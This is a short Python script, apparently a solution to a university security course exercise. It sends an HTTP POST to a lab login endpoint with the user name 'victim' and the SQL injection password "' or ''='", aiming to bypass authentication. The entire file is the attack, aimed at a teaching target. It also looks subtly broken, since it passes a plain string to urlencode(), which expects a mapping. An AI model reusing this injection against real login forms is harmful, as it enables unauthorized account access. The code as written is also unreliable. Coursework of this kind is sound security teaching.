from urllib.parse import urlencode

import requests
import urllib

def create_login(user, password):
    url = "https://project2.ecen4133.org/sqlinject/0"
    query = {
        'user': user,
        'password': password,
    }

    res = requests.post(url, data=query)
    print(res.text)

if __name__ == '__main__':
    create_login('victim', urlencode("' or ''='"))


